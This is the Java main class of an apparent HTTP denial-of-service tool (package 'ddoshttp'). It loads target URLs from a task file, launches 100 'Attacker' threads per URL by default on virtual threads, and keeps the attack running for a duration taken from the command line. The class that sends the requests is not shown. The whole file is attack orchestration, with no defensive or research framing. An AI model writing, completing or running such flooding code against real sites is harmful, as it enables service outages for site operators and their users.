package ua.cc.lajdev.ddoshttp;

import ua.cc.lajdev.ddoshttp.util.FileParser;
import ua.cc.lajdev.ddoshttp.worker.Attacker;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

@SpringBootApplication
public class DemoApplication {

    private static ExecutorService executorService;
    private static int threadsCount = 100;
    private static int attackDuration = 1;

    static {
        executorService = Executors.newVirtualThreadPerTaskExecutor();
    }

    public static void main(String[] args) {
        SpringApplication.run(DemoApplication.class, args);
        var urls = FileParser.getUrls("task.txt");
        isArgsPresent(args);
        printConsole("Attacks started.");
        urls.forEach(DemoApplication::submitThreads);
        shutdownAll();
    }

    private static void shutdownAll() {
        try {
            executorService.awaitTermination(attackDuration, TimeUnit.MINUTES);
        } catch (InterruptedException e) {
            printConsole("Attacks finished.");
        }
    }

    private static void submitThreads(String url) {
        for (int i = 0; i < threadsCount; i++) {
            executorService.submit(Attacker.builder()
                    .hostName(url)
                    .build());
        }
    }

    private static void isArgsPresent(String[] args) {
        if (args.length > 0) {
            attackDuration = Integer.parseInt(args[0]);
            threadsCount = Integer.parseInt(args[1]);
        }
    }

    public static void printConsole(String s) {
        System.out.println(LocalDateTime.now().format(DateTimeFormatter.ISO_LOCAL_DATE_TIME) + ": " + s);
    }
}
